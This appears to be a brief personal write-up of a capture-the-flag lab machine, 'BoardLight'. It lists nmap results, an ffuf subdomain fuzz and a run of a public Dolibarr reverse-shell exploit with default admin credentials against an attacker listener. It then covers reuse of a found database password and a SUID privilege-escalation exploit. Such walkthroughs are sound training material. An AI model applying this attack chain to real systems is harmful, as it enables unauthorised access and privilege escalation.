# nmap scan results

```shell
Nmap scan report for boardlight.htb (10.129.231.37)
Host is up (0.081s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


```

> nothing found on the site except the commented endpoint /portfolio.php and board.htb domain
> it seems like it imports files using `include` 

> used ffuf to fuzz for subdomains 

`ffuf -w <wordlist> -u http://board.htb -H "Host: FUZZ.board.htb" -fs 15949`

> found `crm.board.htb` it uses dolibarr v17.0.0, it has a reverse shell [exploit](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) 
> the site uses default creds admin:admin


> downloaded exploit.py, created an nc listener and executed the exploit, got a shell

`python exploit.py http://crm.board.htb admin admin 10.10.14.78 4444`


> found mysql creds dolibarrowner:serverfun2$2023!!

> password works on larissa user 


> found SUID file with an [exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) linux-gnu-x86_64-0.23.1

> Finished the machine mostly by following a guide, finding subdomain, creds for the user and privesc